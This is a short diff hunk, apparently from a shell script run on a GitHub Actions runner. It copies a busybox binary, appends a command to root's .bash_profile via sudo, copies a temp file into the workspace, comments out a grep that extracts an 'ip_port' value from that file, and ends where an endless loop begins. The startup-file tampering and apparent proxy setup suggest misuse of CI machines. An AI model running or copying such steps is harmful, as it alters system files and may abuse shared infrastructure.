@@ -19,7 +19,7 @@ cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
 sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 
-#[ "715" == "715" ]  && echo  131234455;
+# [ "715" == "715" ]  && echo  131234455;
 
 # [ ! -z "${GITHUB_WORKSPACE}" ] &&(  
   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
@@ -33,8 +33,8 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 [ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
 
-ip_port7pxy2=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
-echo "flag_9832q";
+# ip_port7pxy2=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
+# echo "flag_9832q";
 
 
 (while true; do
